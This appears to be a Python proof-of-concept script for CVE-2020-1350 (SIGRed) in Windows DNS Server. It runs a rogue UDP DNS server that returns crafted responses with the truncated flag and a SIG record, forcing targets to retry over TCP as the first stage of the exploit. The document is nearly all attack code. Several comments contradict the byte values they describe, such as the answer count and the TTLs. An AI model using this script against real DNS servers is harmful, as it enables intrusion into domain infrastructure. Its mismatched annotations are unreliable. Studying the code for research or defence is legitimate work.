# CVE-2020-1350 Proof-of-Concept
# Author: Connor McGarr (@33y0re)
# https://connormcgarr.github.io

import sys
import os
import socket
import struct

# https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/
# https://routley.io/posts/hand-writing-dns-messages/
# https://tools.ietf.org/html/rfc2535#section-4.1

# Credit to @maxspl0it for research done on this!

# Domain doesn't actually get used anywhere except for a print statement
domain = "csredteam.net"

# Length preceeds hex characters + one NULL for (and no periods)
domain_correct = "\x09csredteam\x03net\x00"

# Shorthands
dns_request = None
ip = None

# Starting UDP DNS server (using this to forward request to TCP server)
# SOCK_DGRAM for UDP packets
print "[+] Starting the UDP DNS server"
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Response hex codes found via Wireshark
# https://github.com/miekg/dns/blob/master/types.go#L155
                                                                                                                                     
# Truncated flag is set to force TCP                                                                                                                                                                             
# Sending "data" first- to dynamically obtain length of data later.
udp_data = "\x03" + "123" + "\xc0\x0c"          # Primary name server                                                                
udp_data += "\x03" + "321" + "\xc0\x0c"         # Primary mail server                                                                
udp_data += "\x0B\xFF\xB4\x5F"  # Serial number                                                                                      
udp_data += "\x00\x00\x0e\x10"  # Refresh interval                                                                                   
udp_data += "\x00\x00\x2a\x30"  # Retry Interval                                                                                     
udp_data += "\x00\x01\x51\x80"  # Expire Limit                                                                                       
udp_data += "\x00\x00\x00\x20"  # Minimum TTL (3600)  

udp_response = "\x83\x80"       # Flags (Response, Truncated, Recursion Desired, Recursion Available: set)
udp_response += "\x00\x01"      # Questions: 1
udp_response += "\x00\x00"      # Answer RRs: 1
udp_response += "\x00\x01"      # Authority RRs: 0
udp_response += "\x00\x00"      # Additional RRs: 0
udp_response += "\x0841414141" + domain_correct
udp_response += "\x00\x18"      # Type: SIG
udp_response += "\x00\x01"      # Class: IN (0x0001)
udp_response += "\xc0\x0c"      # Pointer to csredteam.net
udp_response += "\x00\x06"      # Type: SOA
udp_response += "\x00\x01"      # Class: IN (0x0001)
udp_response += "\x00\x00\x00\x20"    # Time to live (TTL: 1799)
udp_response += struct.pack('>H', len(udp_data))    # Data length 

# All together
udp_response_total = udp_response + udp_data

# Start server
s.bind(('0.0.0.0', 53))

while True:
        try:
                message, ip = s.recvfrom(65535)
                print("[+] Received UDP connection")
                s.sendto(message[:2] + udp_response_total, ip)
        except:
                print "[-] Error! Could not establish UDP communications."
                sys.exit(-1)
